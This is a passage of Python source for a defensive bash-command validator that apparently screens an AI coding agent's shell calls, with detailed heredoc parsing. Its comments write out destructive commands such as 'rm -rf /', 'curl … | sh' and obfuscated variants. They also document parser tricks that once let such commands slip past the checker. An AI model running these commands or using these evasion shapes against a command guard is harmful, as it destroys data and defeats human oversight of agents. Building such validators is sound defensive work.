        self.state, self.target_pending = _FRESH, False  # a control operator starts a command


@dataclass
class _ScanState:
    """What `_rewrite_openers` carries from one line to the next.

    ``frames`` are the closers still owed (see `_rewrite_openers`); ``contexts``
    the command contexts open, outermost first - bash lets every one of them
    span a newline, so a scan that reset either per line was bypassed by one.
    """

    frames: list[str] = field(default_factory=list)
    contexts: list[_Context] = field(default_factory=lambda: [_Context()])
    opened: int = 0  # contexts opened so far; each one's `serial`, so later ones compare greater

    def open_context(self, context: _Context) -> None:
        """Push a command context, numbered after every context opened before it."""
        self.opened += 1
        context.serial = self.opened
        self.contexts.append(context)


def _read_delimiter(text: str, pos: int) -> tuple[str, int]:
    """Read the heredoc delimiter word at ``pos``, applying bash's quote removal.

    Bash takes the whole word after `<<`, removes its quotes, and uses the result
    as the terminator: `<<EOF`, `<< "E"OF`, `<< 'E'OF` and `<<\\EOF` all end at a
    line reading exactly `EOF`. Reading only the first quoted run instead yields
    `E`, and the body then swallows every command after the real terminator.

    Returns ``(delimiter, offset just past the word)``.

    Raises:
        ParseError: on an unterminated quote or an empty delimiter. A delimiter
            this cannot tokenize is a body boundary it cannot locate, so the
            caller must not vouch for anything around it.
    """
    delimiter: list[str] = []
    while pos < len(text) and text[pos] not in _WORD_START_AFTER:
        char = text[pos]
        if char == "\\":
            if pos + 1 >= len(text):
                raise ParseError("Heredoc delimiter ends in a backslash")
            delimiter.append(text[pos + 1])
            pos += 2
        elif char in "'\"":
            pos += 1
            while pos < len(text) and text[pos] != char:
                if char == '"' and text[pos] == "\\" and pos + 1 < len(text):
                    pos += 1
                delimiter.append(text[pos])
                pos += 1
            if pos >= len(text):
                raise ParseError(f"Unterminated {char} in heredoc delimiter")
            pos += 1
        else:
            delimiter.append(char)
            pos += 1

    if not delimiter:
        raise ParseError("Heredoc opener with an empty delimiter")
    return "".join(delimiter), pos


def _rewrite_openers(  # noqa: PLR0912, PLR0915 - one branch per lexical state; splitting it hides the state machine
    line: str, scan: _ScanState, at: int, dparen: _DoubleParen
) -> tuple[str, list[tuple[str, bool, int]]]:
    """Replace this line's heredoc delimiters with the placeholder, in shell order.

    Only an *unquoted, unexpanded* `<<` opens a heredoc. Bash reads `echo "x << y"`,
    `# note << z`, `${x:-a<<b}` and `$((1<<2))` as plain text or arithmetic, and
    `<<<` as a here-string; a scan that does not track lexical state invents
    heredocs in all of them, and the phantom body then swallows the real commands
    that follow. That is the LAB-1731 lesson: enumerate the tokenization deltas
    before trusting a rewrite, and deny when the reading is uncertain.

    ``scan.frames`` is that state: the closers still owed, innermost last,
    carried in from the previous line because bash lets every one of them span
    a newline. A quote and an expansion are the same kind of frame on purpose -
    bash nests them in both directions, and tracking them separately is what
    let `"${x:-"<<ZZ "}"` read as a phantom opener (LAB-4270).

    ``scan.contexts`` tracks command position (see `_FRESH`) word by word at the
    top level, one context per open `$(…)`, so that `name[` is a subscript
    exactly where bash reads one. A word is whatever lies between two boundaries
    with every frame closed - `ENV="foo bar"` is one word, `x=$(echo a b)y` is
    one word - and it, too, may continue onto the next line.

    ``at`` is where ``line`` starts in ``dparen``'s text - the whole command -
    because a `((` is decided by text that may lie on later lines.

    Returns ``(rewritten line, [(delimiter, strips_tabs, offset)] in opener
    order)``; each ``offset`` is where its `<<` sits, which is the only honest
    source for "what command owns this heredoc" - a second regex looking for the
    first `<<` would find the quoted ones this deliberately skipped.
    """
    frames = scan.frames
    out: list[str] = []
    openers: list[tuple[str, bool, int]] = []
    continued = False
    pos = 0
    opener_serials: list[int] = []
    if scan.contexts[-1].prefix:
        scan.contexts[-1].start = 0  # a word begun on an earlier line continues from the first column

    while pos < len(line):
        char = line[pos]
        top = frames[-1] if frames else ""
        ctx = scan.contexts[-1]

        if not frames:
            if ctx.compound and char in "(<>;|&" and not (char in "<>" and line.startswith("(", pos + 1)):
                # A compound assignment holds words, `[k]=v`, quotes, expansions
                # and process substitutions - nothing else. Every other
                # construct is a syntax error there, and the two syntax errors
                # bash can raise do not behave alike. A *compound-assignment*
                # error abandons only this line and RUNS THE NEXT (`x=( a >b )`
                # followed by `echo RAN` prints RAN), which is exactly the text
                # a heredoc body would otherwise be read from: `x=(a ; cat)
                # cat <<'E'` really does execute the line after `E`, and
                # scanning on deletes it as a body. A *main-parser* error aborts
                # the script instead (`echo x=(a)` exits 2, running nothing
                # after), which is why the `(` that opens this context needs no
                # command-position gate. One guard rather than one per arm:
                # `(`, `((`, a redirection and `;|&` are each dispatched
                # separately below, and the three the old `case` refusal did not
                # happen to cover were the ones that deleted payload.
                raise ParseError(f"`{char}` inside a compound assignment; bash skips the line and runs the next")
            # Word and command-context bookkeeping, before the lexical dispatch.
            if line.startswith("((", pos) and dparen.is_arithmetic(at + pos):
                # `(( 1<<b ))` is a left shift, on this line or a later one. No
                # word-start gate: bash accepts `then((` and `{((`, and what a
                # gate would exclude - `x=((`, `echo a((` - is a syntax error it
                # runs nothing of, so reading it as arithmetic can only deny.
                ctx.end_word(line, pos)
                frames.extend("))")
                out.append("((")
                pos += 2
                continue
            if (line.startswith("$(", pos) and not line.startswith("$((", pos)) or (
                char in "<>" and line.startswith("(", pos + 1)
            ):
                # `$(…)`, `<(…)`, `>(…)`: shell again inside, and a heredoc in
                # there is real, so it is a context rather than a frame. The
                # outer word continues after its `)`; its head is folded away
                # now so that nothing is re-folded per open context later.
                if ctx.start is None:
                    ctx.start = pos
                ctx.fold(line, pos + 2)
                scan.open_context(_Context(comsub=True, opener=line[pos : pos + 2]))
                out.append(line[pos : pos + 2])
                pos += 2
                continue
            if char == "`":
                # A top-level backtick is shell again, exactly like `$(…)`, and
                # `_expansion_frame_at` deliberately does not frame it so the
                # heredocs inside it stay findable. It had no context of its
                # own, so its contents were read against the *enclosing* one and
                # an operator inside it reset the outer command position that
                # was not its to reset. That invents an opener:
                # `x=`ls | sort` y[1<<b]=1` is one assignment word to bash, which
                # runs the line and opens no heredoc, while this read `b]=1` as a
                # delimiter and deleted the next line as its body. One character
                # both opens and closes, so the open context decides which.
                if ctx.backtick:
                    scan.contexts.pop()
                    scan.contexts[-1].start = pos  # the outer word resumes, as after a `$(…)`
                else:
                    if ctx.start is None:
                        ctx.start = pos
                    ctx.fold(line, pos + 1)
                    scan.open_context(_Context(comsub=True, backtick=True, opener="`"))
                out.append(char)
                pos += 1
                continue
            if char == ")" and len(scan.contexts) > 1:
                ctx.end_word(line, pos)
                closed = scan.contexts.pop()
                if closed.comsub:
                    scan.contexts[-1].start = pos  # the outer word resumes; its head is in `prefix`
                out.append(char)
                pos += 1
                continue
            if char == "(":
                if ctx.start is not None and _ASSIGNMENT_PREFIX_RE.fullmatch(ctx.word(line, pos)):
                    # `x=( … )`: one assignment word, in which every element
                    # may carry a subscript - `[k]=v` included.
                    ctx.fold(line, pos + 1)
                    scan.open_context(_Context(comsub=True, compound=True, opener="=("))
                else:
                    # A subshell: its own commands, its own `)`. The outer
                    # context is reset here, so after the `)` it is at command
                    # position - which is where `case a in (a) b[0]=1` needs it.
                    ctx.end_word(line, pos)
                    ctx.operator()
                    scan.open_context(_Context(opener="("))
                out.append(char)
                pos += 1
                continue
            if char in "<>" and ctx.start is not None and not _FD_RE.fullmatch(ctx.word(line, pos)):
                ctx.end_word(line, pos)  # `x=1>f`, `time>f`: the operator starts a new word
                ctx.start = pos
            elif char == "-" and ctx.start is not None and _FD_CLOSE_RE.fullmatch(ctx.word(line, pos)):
                ctx.end_word(line, pos)  # `2>&` owes a target…
                ctx.start = pos
                ctx.end_word(line, pos + 1)  # …and this `-` is the whole of it
            elif _is_word_boundary(line, pos):
                ctx.end_word(line, pos)
                if char not in " \t":
                    ctx.operator()
            elif ctx.start is None:
                ctx.start = pos

        # `char != top` because a backtick both opens and closes its own frame:
        # without it the `` ` `` ending `"`date`"` opens a second one, the string
        # never closes, and every opener after it is lost.
        frame = (
            _expansion_frame_at(line, pos, bool(frames))
            if char in _FRAME_START_CHARS and char != top and top not in ("'", "$'")
            else None
        )

        if top in ("'", "$'"):
            # A single-quoted run is literal to its close. `$'…'` is ANSI-C
            # quoting and still honours backslash escapes, so `\'` does not end
            # it; `'…'` has no escapes at all.
            if char == "'":
                frames.pop()
            elif char == "\\" and top == "$'" and pos + 1 < len(line):
                out.append(char)
                pos += 1
                char = line[pos]
            out.append(char)
            pos += 1
        elif frame:
            opener, owed = frame
            frames.extend(owed)
            out.append(opener)
            pos += len(opener)
        elif frames and char == top:
            frames.pop()  # closes a quote, a backtick or an expansion
            out.append(char)
            pos += 1
        elif frames and char == _EXPANSION_NESTS_ON.get(top):
            frames.append(top)  # `$(( ((1))<<2 ))`, `$[arr[1]<<2]`
            out.append(char)
            pos += 1
        elif top == '"':
            # Everything else inside `"…"` is literal, `'` included.
            if char == "\\" and pos + 1 < len(line):
                out.append(char)
                pos += 1
                char = line[pos]
            out.append(char)
            pos += 1
        elif char == "\\":
            continued = pos + 1 >= len(line)
            out.append(line[pos : pos + 2])
            pos += 2
        elif char == "$" and pos + 1 < len(line) and line[pos + 1] in "'\"":
            # $'…' is ANSI-C quoting, $"…" is locale translation; $" is
            # otherwise an ordinary double quote.
            frames.append("$'" if line[pos + 1] == "'" else '"')
            out.append(line[pos : pos + 2])
            pos += 2
        elif char in "'\"":
            frames.append(char)
            out.append(char)
            pos += 1
        elif char == "[" and not frames and ctx.opens_subscript(line, pos):
            # `a[1<<b]=1` is a shift: an identifier opening a word where an
            # assignment is acceptable makes `[` a subscript. Off that position
            # - a command's argument, a redirection's target - it is a glob
            # character bash opens a heredoc through (`cat f[a<<b]`, verified).
            if ctx.start is None:
                ctx.start = pos  # `x=( [k]=v )`: the word begins at the bracket
            frames.append("]")
            out.append(char)
            pos += 1
        elif char == "[" and not frames:
            ctx.glob = True  # a glob character; no later `[` in this word is a subscript either
            out.append(char)
            pos += 1
        elif char == "#" and not frames and not ctx.prefix and (pos == 0 or line[pos - 1] in _WORD_START_AFTER):
            # `#` is ordinary inside every frame - `${#x}`, `${x#pre}` - so the
            # comment branch must not abandon the scan mid-expansion. An open
            # word rules it out too, for its own reason: `ctx.prefix` means text
            # is already folded into this word, so `echo $(date)#x` and a
            # `\`-continued `a\<newline>#x` are single words bash reads `#` inside.
            # `prefix` and not `ctx.start`, which is set for every character that
            # reaches here; and not `ctx.word()`, which is empty right after a
            # redirection operator, where bash really does comment (`cat 2>#f`).
            # The cost of using `prefix` is that a lone operator can be the folded
            # text - `cat >\<newline>#f` reads `#f` as a word - which is a shape
            # bash rejects outright, so it can invent an opener but not hide one.
            out.append(line[pos:])  # comment: text, not shell
            break
        elif line.startswith("<<<", pos):
            out.append("<<<")  # here-string, not a heredoc (LAB-2768)
            pos += 3
        elif line.startswith("<<", pos) and not frames:
            opener_at = pos
            pos += 2
            strips_tabs = line.startswith("-", pos)
            pos += 1 if strips_tabs else 0
            while pos < len(line) and line[pos] in " \t":
                pos += 1
            delimiter, pos = _read_delimiter(line, pos)
            openers.append((delimiter, strips_tabs, opener_at))
            opener_serials.append(scan.contexts[-1].serial)
            out.append(f"<<{'-' if strips_tabs else ''}{_HEREDOC_PLACEHOLDER}")
        else:
            out.append(char)
            pos += 1

    ctx = scan.contexts[-1]
    if continued:
        ctx.fold(line, len(line) - 1)  # bash removes the backslash-newline pair; the word goes on
    elif not frames:
        ctx.end_word(line, len(line))
        ctx.operator()  # a newline at the top level separates commands
    elif ctx.start is not None:
        ctx.fold(line, len(line))
        ctx.prefix += "\n"  # inside a quote or expansion the word continues, newline and all

    if openers and (continued or frames or scan.contexts[-1].serial > min(opener_serials)):
        # A trailing `\`, a quote or expansion still open, or a `$(` opened
        # after an opener and not yet closed, means this line does not finish
        # the command, so bash starts the body after a later line. Consuming it
        # from the next one would delete the commands between.
        # The test is identity, not depth: `$(cat <<'A') ; $(echo` closes one
        # substitution and opens another at the same depth, so a depth
        # comparison sees nothing while the line plainly does not end. A later
        # serial still open is exactly `something opened after an opener`.
        why = "trailing backslash" if continued else "unclosed " + (frames[-1] if frames else _open_context_name(scan))
        raise ParseError(f"Heredoc opener on a line that continues ({why}); the body's start is unknown")

    return "".join(out), openers


def _neuter_heredocs(command: str) -> tuple[str, str]:
    """Rewrite a heredoc into something bashlex parses, keeping the rest verbatim.

    bashlex rejects a quoted heredoc delimiter outright, which is why this
    fallback exists at all - and why the shell *around* the heredoc (a trailing
    ``rm -rf /``, an enclosing ``for … done``) arrives here unparsed. Bash has no
    such trouble, so that surrounding shell has to be recovered somehow.

    Two edits make the command parseable without changing what the surrounding
    shell means: give every heredoc the same bare placeholder delimiter, and
    replace each body with a single blank line. Discarding the body is
    load-bearing rather than tidy - a bare delimiter tells bash to expand the
    body, so leaving ``$(rm -rf /)`` inside a ``<<'EOF'`` body would turn literal
    text into an executable substitution and deny a safe command. (Substitution
    inside a heredoc body is LAB-2756's hole, not this one.) It also keeps the
    cost flat: writing a 5000-line file through a heredoc is an everyday
    operation, and its body is not shell that needs validating.

    Returns ``(rewritten command, text before the first heredoc opener)``.

    Raises:
        ParseError: when the reading is uncertain - a delimiter that cannot be
            tokenized, a body whose terminator never arrives, or no opener at
            all in a command bashlex rejected *as* a heredoc. Each means the
            body boundaries are unknown, so which text is shell and which is
            inert data is unknown too. The caller denies rather than guess.
    """
    lines = command.split("\n")
    rewritten: list[str] = []
    base_command: Optional[str] = None
    scan = _ScanState()
    dparen = _DoubleParen(command)
    at = 0  # where lines[index] starts in command
    index = 0

    while index < len(lines):
        line, openers = _rewrite_openers(lines[index], scan, at, dparen)
        rewritten.append(line)
        at += len(lines[index]) + 1
        index += 1

        if base_command is None and openers:
            base_command = lines[index - 1][: openers[0][2]].strip()

        # Bodies are consumed in opener order. `<<-` strips leading tabs from the
        # terminator line as well as the body, so the comparison has to match
        # bash's or a body line would be mistaken for the terminator.
        for delimiter, strips_tabs, _ in openers:
            # One placeholder line stands in for the entire body. It cannot be
            # dropped altogether: bashlex rejects an empty heredoc inside a
            # compound statement, which would deny every `for … do
            # cat <<'EOF' … EOF done`. One line costs the same either way.
            rewritten.append("")
            while index < len(lines):
                body = lines[index]
                at += len(body) + 1
                index += 1
                if (body.lstrip("\t") if strips_tabs else body) == delimiter:
                    rewritten.append(_HEREDOC_PLACEHOLDER)
                    break
            else:
                raise ParseError(f"Heredoc {delimiter!r} has no terminator; its body has no end")

    if scan.frames or len(scan.contexts) > 1:
        # An unclosed quote, expansion, `((`, subscript or `$(` at the end is
        # a syntax error to bash - it runs nothing - and a reading this lexer
        # cannot vouch for either way.
        unclosed = scan.frames[-1] if scan.frames else _open_context_name(scan)
        raise ParseError(f"Command ends inside an unclosed {unclosed}; bash would run none of it")
    if base_command is None:
        raise ParseError("No heredoc opener found in a command bashlex rejected as a heredoc")
    if not base_command:
        raise ParseError("Heredoc with no command in front of it")

    return "\n".join(rewritten), base_command


def _validate_heredoc_command(
    command: str,
    config_path: Optional[str] = None,
    *,
    _derived: bool = False,
) -> Optional[ValidationResult]:
    """Validate command containing heredoc that bashlex couldn't parse.

    Bashlex doesn't support quoted heredoc delimiters (e.g. << 'EOF'). This
    validates the command in front of the heredoc, then the shell the heredoc
    does not swallow as the separate commands bash will run, taking the worse
    of the two verdicts.

    SECURITY: the heredoc head vouches only for itself. A whitelisted `ls` does
    not make `rm -rf /` after the terminator safe (LAB-2765).

    Args:
        command: Full command string with heredoc
        config_path: Optional rules config path

    Returns:
        ValidationResult, or None if the fallback could not be applied at all
        (the caller then reports the original bashlex parse error)
    """
    try:
        engine = _get_rule_engine(config_path)
        neutered, base_command = _neuter_heredocs(command)
        # The rewrite is schlock's text, not the caller's: bound it as derived, before
        # _escalate_past_heredoc parses it and re-validates it through the front door.
        over = _over_size_ceiling(neutered, derived=True)
        if over is not None:
            return over
        base_result = _heredoc_base_result(engine, base_command)
        return _escalate_past_heredoc(command, neutered, base_result, config_path)
    except ParseError as e:
        # Shell we cannot read is shell we cannot vouch for.
        logger.debug(f"Heredoc unreadable, failing closed: {e}")
        return ValidationResult(
            allowed=False,
            risk_level=RiskLevel.BLOCKED,
            message=f"BLOCKED: Cannot determine what this heredoc runs: {e}",
            alternatives=["Run the commands around the heredoc separately"],
            exit_code=1,
            error=str(e),
        )
    except Exception as e:
        logger.warning(f"Heredoc validation fallback failed: {e}", exc_info=True)
        return None


def _heredoc_base_result(engine: "RuleEngine", base_command: str) -> ValidationResult:
    """Verdict for the heredoc's own command, ignoring everything around it."""
    first_word = base_command.split()[0]

    if engine.is_whitelisted(first_word):
        return ValidationResult(
            allowed=True,
            risk_level=RiskLevel.SAFE,
            message=f"Heredoc command '{first_word}' is whitelisted",
            alternatives=[],
            exit_code=0,
            error=None,
            matched_rules=[],
        )

    # Check if base command matches any dangerous patterns. Quote context
    # matters as much here as anywhere: without it a commit message mentioning
    # `rm -rf /` is a hard BLOCK on a command that is LOW without the heredoc.
    parser = _get_parser()
    try:
        literals = parser.extract_string_literals(base_command, parser.parse(base_command))
    except (ParseError, ValueError):
        literals = None  # a compound head like `for f in a b; do cat` need not parse alone
    match = engine.match_command(base_command, string_literals=literals)
    if match.matched and match.rule:  # rule is guaranteed by __post_init__ but helps type checker
        return ValidationResult(
            allowed=match.risk_level not in (RiskLevel.BLOCKED,),
            risk_level=match.risk_level,
            message=f"Heredoc base command: {match.rule.description}",
            alternatives=match.alternatives,
            exit_code=0 if match.risk_level != RiskLevel.BLOCKED else 1,
            error=None,
            matched_rules=[match.rule.name],
        )

    # No rules matched - allow with LOW risk (heredoc content not validated)
    return ValidationResult(
        allowed=True,
        risk_level=RiskLevel.LOW,
        message=f"Heredoc command '{first_word}' allowed (content not validated)",
        alternatives=[],
        exit_code=0,
        error=None,
        matched_rules=[],
    )


def _refuse_a_heredoc_the_rewrite_did_not_write(nodes: list[Any]) -> None:
    """Deny when bashlex reads a heredoc here that the lexer ruled out.

    The rewrite gives every opener it found the same placeholder delimiter, so
    any other one means bashlex located an opener this lexer decided was not
    there - and on the re-parse bashlex wins, taking the lines behind it as
    inert body. That is LAB-4270's deletion again, one parser over: bash reads
    `(( 1<<b ))` as a left shift and so does `_rewrite_openers`, but bashlex
    reads `<<b` as a redirection, and a `rm -rf /` on the next line becomes its
    body - dropped before a single rule runs, with the verdict left at the
    heredoc head's own floor.

    It was fail-closed by accident until `_close_heredocs` landed: the segment
    re-entered this fallback, found no terminator and raised. Re-attaching the
    body made it parse, which is correct for a real heredoc and is exactly what
    removed the accident. Nothing here should rest on that again, so the
    disagreement is now detected rather than survived.

    Two readings of the same text, and no ground to prefer either: the body
    boundaries are unknown, so the caller denies.

    Raises:
        ParseError: naming the delimiter bashlex invented.
    """

    def visit(node: Any) -> None:
        if getattr(node, "heredoc", None) is not None:
            word = getattr(getattr(node, "output", None), "word", None)
            if word is not None and word.strip() != _HEREDOC_PLACEHOLDER:
                raise ParseError(
                    f"bashlex reads a heredoc {word.strip()!r} that this command does not open; "
                    "the text behind it would be dropped as its body"
                )
        for attribute in ("parts", "list", "commands"):
            for child in getattr(node, attribute, None) or []:
                visit(child)

    for node in nodes:
        visit(node)


def _escalate_past_heredoc(
    command: str,
    neutered: str,
    result: ValidationResult,
    config_path: Optional[str] = None,
) -> ValidationResult:
    """Raise ``result`` to the verdict of the shell around the heredoc.

    A whitelisted heredoc head vouches for itself and nothing else. Text after
    the terminator, or after a `;` on the opener line, is real shell that really
    executes, and before this it was never looked at (LAB-2765).

    The rewritten command is validated through the front door, so it gets the
    whole pipeline - segments, substitutions, dangerous flags, rules - rather
    than a second hand-rolled approximation of it. Its segments are then
    validated individually as well, because a full-span whitelist entry
    short-circuits the whole-command pass before the per-segment loop it relies
    on. A whitelisted *prefix* used to do the same; #146 (LAB-2752) narrowed
    that gate to `is_fully_whitelisted`, so the prefix case no longer reaches
    it, but an end-anchored entry still does.
    Neither pass subsumes the other: the whole-command pass is the only one that
    sees `curl … | sh` as a pipeline, the per-segment pass is the only one the
    whitelist cannot silence.

    Both passes run with ShellCheck off, and ShellCheck runs once here, on the
    whole rewrite. It is a subprocess per call, so leaving it on in every pass
    cost N+2 spawns for a heredoc followed by N commands (LAB-2780). It cannot
    simply stay on in the whole-command pass alone: a full-span whitelist entry
    short-circuits that pass before its ShellCheck step, and the per-segment
    pass is then the only place the trailing commands are ShellChecked at all -
    `"rm" -rf /` and `rm -$''rf /` are caught by nothing else. Running it here
    sees every segment in one spawn and depends on no predicate about the other
    function's short-circuit; gating on "was the whole-command pass
    whitelisted" would, and was rejected as a fail-open coupling. Rule matching
    alone in place of the per-segment re-entry was rejected for the same kind of
    loss: the re-entry is what gives a segment behind a whitelisted head its
    quote-stripped match (`r\\m -rf /`) and its contextual checks
    (`kubectl delete`). A payload a segment delegates to a shell (`bash -c …`)
    is re-entered with ShellCheck on by Step 5c, deliberately: ShellCheck never
    reads inside a `-c` string, so that re-entry is the payload's only check.
    Each of those spawns is the only ShellCheck its text gets, so each fails
    closed: a run with no verdict is BLOCKED, not read as clean (LAB-4586).

    Escalation only ever raises risk. That is what keeps a legitimate heredoc's
    existing verdict intact, and it bounds a misread body *end* to a false
    positive. It does not bound a misread body *start*: text swallowed into a
    body is gone from ``neutered`` before this runs, so there is nothing left
    to escalate on and the verdict stays at ``result``'s floor. Monotonicity is
    a property of the text this sees, and a phantom opener is exactly the text
    it does not.

    Returns ``result``, or the worst verdict among the commands around it.
    """
    parser = _get_parser()
    nodes = parser.parse(neutered)
    _refuse_a_heredoc_the_rewrite_did_not_write(nodes)
    segments = parser.extract_command_segments(neutered, nodes)

    # `neutered != command` keeps the recursion finite: re-validating an
    # unchanged command would re-enter this same fallback forever.
    candidates = [neutered] if neutered != command else []
    # Shed the rewritten heredoc rather than skipping the segment: the command
    # in front of it is exactly the one nothing used to look at, and
    # `chmod -R 777 / <<'Y'` is not made safe by owning a body. Since LAB-1732
    # a segment closes its own heredoc, so this is no longer what makes the
    # candidate parseable - it is what makes it a PLAIN command. That still
    # matters: an end-anchored rule (`^\s*env\s*$`) cannot match past a
    # trailing placeholder, so leaving one on flips `env` to SAFE at the rule
    # layer, and the reconstructed view is no substitute because it drops
    # redirection targets (`cat <<X > out.txt` reconstructs to `cat`).
    candidates += [_HEREDOC_REDIRECT_RE.sub("", segment) for segment in segments]

    for candidate in candidates:
        if not candidate.strip():
            continue
        candidate_result = validate_command(candidate, config_path, _shellcheck=False, _derived=True)
        if candidate_result.risk_level.value > result.risk_level.value:
            result = replace(candidate_result, message=f"Alongside heredoc: {candidate_result.message}")

    if result.risk_level < RiskLevel.BLOCKED and is_shellcheck_available():
        findings = run_shellcheck(neutered)
        if findings is None:
            # This spawn is the only ShellCheck the commands around the heredoc get, so a
            # run with no verdict (timeout, oversized output, open circuit) is refused,
            # not skipped: read as clean, a slow input was a switch for the control
            # (LAB-4586). Named in matched_rules so the audit log can tell this deny apart.
            return replace(
                result,
                allowed=False,
                risk_level=RiskLevel.BLOCKED,
                message="Alongside heredoc: ShellCheck did not complete, so the shell around the heredoc is unchecked",
                alternatives=[
                    "Run the commands after the heredoc as a separate, shorter Bash call",
                    "If every heredoc is refused, ShellCheck itself is failing: fix or uninstall it",
                ],
                exit_code=1,
                matched_rules=[*result.matched_rules, "shellcheck:incomplete"],
            )
        findings = get_security_findings(findings)
        if findings:
            result = replace(
                result,
                allowed=False,
                risk_level=RiskLevel.BLOCKED,
                message=f"Alongside heredoc: ShellCheck: {findings[0].message}",
                alternatives=[f"See {findings[0].wiki_url}"],
                exit_code=1,
                matched_rules=[*result.matched_rules, f"shellcheck:{findings[0].sc_code}"],
            )

    return result


def _substitution_denial(sub_result: SubstitutionValidationResult) -> ValidationResult:
    """Render a substitution verdict as a ValidationResult.

    The hook maps risk to the action, so only a genuine BLOCKED verdict may claim the word: an
    amplified-HIGH one is shown as an "ask" prompt, and a prompt whose text reads "BLOCKED" tells
    the user the opposite of the truth.
    """
    denied = sub_result.risk_level == RiskLevel.BLOCKED
    return ValidationResult(
        allowed=False,
        risk_level=sub_result.risk_level,
        message=f"BLOCKED: {sub_result.message}" if denied else sub_result.message,
        alternatives=[
            "Use whitelisted read-only commands in substitution (e.g. ls, cat, grep, head, wc, sort, git)",
            "Run the command directly instead of using substitution",
            "If this command is safe, request it be added to the whitelist",
        ],
        exit_code=1,
        error=None,
    )


def validate_command(
    command: str,
    config_path: Optional[str] = None,
    *,
    _depth: int = 0,
    _shellcheck: bool = True,
    _derived: bool = False,
) -> ValidationResult:
    """Validate a command for safety — the main validation API.

    Runs every pass (:func:`_validate_command`), then joins the verdict with any substitution
    denial too weak to have short-circuited it. The join lives HERE, outside the passes, because
    a join made at any one pass is a join the passes added after it will miss: that is precisely
    how a BLOCKED netcat backdoor and a BLOCKED pipeline segment each walked back down to HIGH
    merely by having a substitution appended. Whatever returns first, the worse verdict wins.

    ``_depth``, ``_shellcheck`` and ``_derived`` are internal, keyword-only; see
    :func:`_validate_command`.
    """
    deferred: list[SubstitutionValidationResult] = []
    result = _validate_command(
        command, config_path, _depth=_depth, _deferred=deferred, _shellcheck=_shellcheck, _derived=_derived
    )
    if not deferred:
        return result
    sub_denial = deferred[0]
    # A denial always beats an allow, whatever their levels; between two denials the higher
    # level wins, and a tie keeps the completed verdict because it carries the matched rules.
    if result.allowed or sub_denial.risk_level > result.risk_level:
        return _substitution_denial(sub_denial)
    return result


def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation flow
    command: str,
    config_path: Optional[str] = None,
    *,
    _depth: int = 0,
    _deferred: Optional[list[SubstitutionValidationResult]] = None,
    _shellcheck: bool = True,
    _derived: bool = False,
) -> ValidationResult:
    """Run every validation pass. Call :func:`validate_command` instead.

    ``_deferred`` is an out-parameter: a substitution denial too weak to short-circuit is placed
    there for the caller to join. It is a list rather than a return value so that every one of
    this function's returns carries it without having to remember to.

    Validate command for safety.

    Main validation API. Orchestrates parsing, rule matching, and caching.

    Validation flow:
    0. Refuse input over its size ceiling (fail-closed, O(1), before any parse): MAX_COMMAND_SIZE
       for what the caller submitted, MAX_DERIVED_COMMAND_SIZE for text schlock derived from it
    1. Check cache for previous result
    2. Validate input (empty check)
    3. Special case checks (git reset --hard, etc.)
    4. Parse command with BashCommandParser
    5. Match against rules with RuleEngine
    6. Build ValidationResult
    7. Cache result
    8. Return result

    IMPORTANT: This function never raises exceptions. All errors are caught
    and returned in ValidationResult.error field.

    Args:
        command: Bash command string to validate
        config_path: Optional path to rules file (for testing)
        _depth: Internal, keyword-only. Shell-delegation recursion depth; callers leave it at 0.
        _shellcheck: Internal, keyword-only. False skips the ShellCheck subprocess and leaves the
            verdict out of the cache; for a fragment of a command that is ShellChecked whole
            elsewhere. Applies to this call only: a shell-delegated payload (Step 5c) is re-entered
            with ShellCheck on, deliberately - ShellCheck never reads inside a `-c` string, so that
            re-entry is the payload's only check.
        _derived: Internal, keyword-only. True when ``command`` is text schlock produced from an
            admitted command (a heredoc rewrite or one of its segments), so the derived-text
            ceiling applies, not the caller's. Callers leave it False.

    Returns:
        ValidationResult with validation outcome (never raises)

    Example:
        >>> result = validate_command("rm -rf /")
        >>> print(result.allowed)  # False
        >>> print(result.risk_level)  # RiskLevel.BLOCKED
        >>> print(result.exit_code)  # 1
    """
    try:
        # Step 0: Size ceiling. bashlex plus the rule pass cost tens of ms per KB, and Claude Code
        # runs this hook before every Bash call with a fail-OPEN timeout, so unbounded input length
        # is a bypass, not a slowdown. This bounds LENGTH only: rule patterns that are superlinear
        # in the input still cost seconds well under the ceiling (LAB-3449), so the fail-open
        # class is narrowed here, not closed. Deny (never skip, unlike commit_filter's local
        # fail-open guard), before the cache lookup so a multi-MB string is never hashed or stored.
        # Text schlock derived from an admitted command is judged by its own bound, with a
        # message that says so: the caller never submitted that string.
        over = _over_size_ceiling(command, derived=_depth > 0 or _derived)
        if over is not None:
            return over

        # Step 1: Check cache, after dropping any verdicts a different ruleset left behind.
        # Inline rather than a plain call: this guards every cached hit and the call alone
        # cost ~50ns of a ~410ns cached call, which is the whole margin against main. It is
        # the outer half of the helper's double-checked lock, so it must stay before the
        # lookup and must never be NARROWER than the helper's own compare.
        if _global_cache_path != config_path:
            _invalidate_on_ruleset_change(config_path)
        cached = _global_cache.get(command)
        if cached is not None:
            return cached

        # Step 2: Validate input
        if not command or not command.strip():
            return ValidationResult(
                allowed=False,
                risk_level=RiskLevel.BLOCKED,
                message="Empty command rejected",
                alternatives=[],
                exit_code=1,
                error="Command cannot be empty or whitespace-only",
            )
            # Don't cache errors

        # Step 3: Special case checks
        special_check = _check_special_cases(command)
        if special_check is not None:
            # Special case triggered, return result (don't cache, state may change)
            return special_check

        # Step 4: Parse command and extract AST context
        parser = _get_parser()
        try:
            ast = parser.parse(command)
            # Extract string literals for context-aware matching
            string_literals = parser.extract_string_literals(command, ast)

            # Extract heredoc ranges - matches inside non-shell heredocs should be ignored
            # 'cat << EOF' just outputs text, 'bash << EOF' executes it
            heredoc_ranges = parser.extract_heredoc_ranges(command, ast)

            # Check for dangerous constructs (eval/exec, dangerous pipelines)
            dangerous_constructs = parser.has_dangerous_constructs(ast)
            if dangerous_constructs:
                return ValidationResult(
                    allowed=False,
                    risk_level=RiskLevel.BLOCKED,
                    message=f"BLOCKED: Dangerous shell construct detected - {', '.join(dangerous_constructs)}",
                    alternatives=[
                        "Never use eval or exec - they enable arbitrary code execution",
                        "Run commands directly instead of dynamically generating them",
                    ],
                    exit_code=1,
                    error=None,
                )
                # Don't cache (construct may be context-dependent)

            # Validate command/process substitution using AST-based analysis
            # This uses whitelist-first, recursive validation for security
            sub_validator = _get_substitution_validator(config_path)
            sub_results = sub_validator.validate_all_substitutions(ast)

            # Worst verdict wins, and the join is NOT made here. Returning a denial from this
            # point skips every pass below it — the AST dangerous-flag pass (the only thing that
            # sees quoted command names) and the multi-segment pass (the only thing that isolates
